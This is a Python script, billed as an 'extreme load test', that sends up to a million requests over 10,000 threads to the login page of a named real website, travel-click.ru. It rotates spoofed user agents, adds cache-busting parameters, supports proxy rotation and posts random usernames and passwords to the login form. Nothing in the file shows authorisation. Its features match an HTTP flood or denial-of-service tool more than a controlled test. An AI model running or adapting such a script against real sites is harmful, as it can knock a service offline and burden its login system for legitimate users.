import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
from fake_useragent import UserAgent
import json
from collections import defaultdict
import socket
import sys

# Конфигурация
TARGET_URL = "https://travel-click.ru/login.page"
REQUESTS_COUNT = 1000000  # Увеличиваем в 5 раз
THREADS_COUNT = 10000 # Увеличиваем количество потоков
TEST_DURATION = 300  # 5 минут
REQUEST_TIMEOUT = (5, 30)  # Увеличиваем таймауты
USE_PROXIES = False  # Включить, если есть прокси
PROXY_LIST = []  # Список прокси, если нужны

# Инициализация
ua = UserAgent()
session = requests.Session()


def get_random_headers():
    return {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer': 'https://travel-click.ru/',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }


def get_proxy():
    if USE_PROXIES and PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None


def simulate_complex_request(url, request_num):
    metrics = {
        'request_num': request_num,
        'status': None,
        'time': None,
        'success': False,
        'error_type': None,
        'error_details': None,
        'response_size': 0,
        'redirects': 0,
        'dns_time': None,
        'server_ip': None
    }

    try:
        # Измерение DNS
        start_dns = time.time()
        hostname = url.split('/')[2]
        server_ip = socket.gethostbyname(hostname)
        metrics.update({
            'dns_time': time.time() - start_dns,
            'server_ip': server_ip
        })

        # Параметры запроса
        params = {
            'headers': get_random_headers(),
            'timeout': REQUEST_TIMEOUT,
            'allow_redirects': True,
            'verify': True
        }

        if USE_PROXIES:
            proxy = get_proxy()
            if proxy:
                params['proxies'] = {
                    'http': proxy,
                    'https': proxy
                }

        # Чередуем GET и POST запросы
        start_time = time.time()
        if random.random() > 0.7:  # 30% POST запросов
            # Симуляция отправки формы
            response = session.post(
                url,
                data={
                    'username': f'testuser{random.randint(1, 10000)}',
                    'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=12)),
                    'remember': 'on'
                },
                **params
            )
        else:
            # GET запрос с возможными параметрами
            response = session.get(
                url,
                params={'cache_bust': random.randint(1, 100000)} if random.random() > 0.5 else None,
                **params
            )

        metrics.update({
            'status': response.status_code,
            'time': time.time() - start_time,
            'success': response.status_code == 200,
            'response_size': len(response.content),
            'url': response.url,
            'redirects': len(response.history)
        })

    except requests.exceptions.SSLError as e:
        metrics['error_type'] = 'SSL Error'
        metrics['error_details'] = str(e)
    except requests.exceptions.ConnectionError as e:
        metrics['error_type'] = 'Connection Error'
        metrics['error_details'] = str(e)
    except requests.exceptions.Timeout as e:
        metrics['error_type'] = 'Timeout'
        metrics['error_details'] = str(e)
    except Exception as e:
        metrics['error_type'] = type(e).__name__
        metrics['error_details'] = str(e)

    return metrics


def print_progress(current, total, start_time, errors):
    elapsed = time.time() - start_time
    req_per_sec = current / elapsed if elapsed > 0 else 0
    sys.stdout.write(
        f"\r🚀 Progress: {current}/{total} | "
        f"Speed: {req_per_sec:.1f} req/sec | "
        f"Errors: {errors} | "
        f"Elapsed: {elapsed:.1f}s"
    )
    sys.stdout.flush()


def run_load_test():
    print(f"🔥 EXTREME LOAD TEST STARTED: {TARGET_URL}")
    print(f"⚡ Configuration: {REQUESTS_COUNT} requests, {THREADS_COUNT} threads")

    metrics = []
    start_test_time = time.time()
    error_count = 0

    with ThreadPoolExecutor(max_workers=THREADS_COUNT) as executor:
        futures = [executor.submit(simulate_complex_request, TARGET_URL, i)
                   for i in range(REQUESTS_COUNT)]

        for i, future in enumerate(as_completed(futures)):
            result = future.result()
            metrics.append(result)

            if not result['success']:
                error_count += 1

            # Вывод прогресса каждые 50 запросов или последний
            if i % 50 == 0 or i == REQUESTS_COUNT - 1:
                print_progress(i + 1, REQUESTS_COUNT, start_test_time, error_count)

            # Прерывание по времени
            if time.time() - start_test_time > TEST_DURATION:
                print("\n⏰ Test duration reached, stopping...")
                break

    # Анализ результатов
    analyze_results(metrics, start_test_time)


def analyze_results(metrics, start_time):
    successful = [m for m in metrics if m['success']]
    failed = [m for m in metrics if not m['success']]

    print("\n\n📊 FINAL RESULTS:")
    print(f"✅ Successful requests: {len(successful)}/{len(metrics)} ({len(successful) / len(metrics) * 100:.1f}%)")
    print(f"❌ Failed requests: {len(failed)}")
    print(f"⏱ Total test time: {time.time() - start_time:.1f} seconds")

    if successful:
        avg_time = sum(m['time'] for m in successful) / len(successful)
        print(f"\n⏱ Average response time: {avg_time:.3f}s")
        print(f"🐢 Slowest response: {max(m['time'] for m in successful):.3f}s")
        print(f"⚡ Fastest response: {min(m['time'] for m in successful):.3f}s")

    if failed:
        error_types = defaultdict(int)
        for m in failed:
            error_types[m['error_type']] += 1

        print("\n🔍 Error analysis:")
        for error, count in sorted(error_types.items(), key=lambda x: x[1], reverse=True):
            print(f"  {error}: {count} errors")

    # Сохранение результатов
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"extreme_test_{timestamp}.json"
    with open(filename, 'w') as f:
        json.dump(metrics, f, indent=2)
    print(f"\n📄 Full results saved to {filename}")


if __name__ == "__main__":
    run_load_test()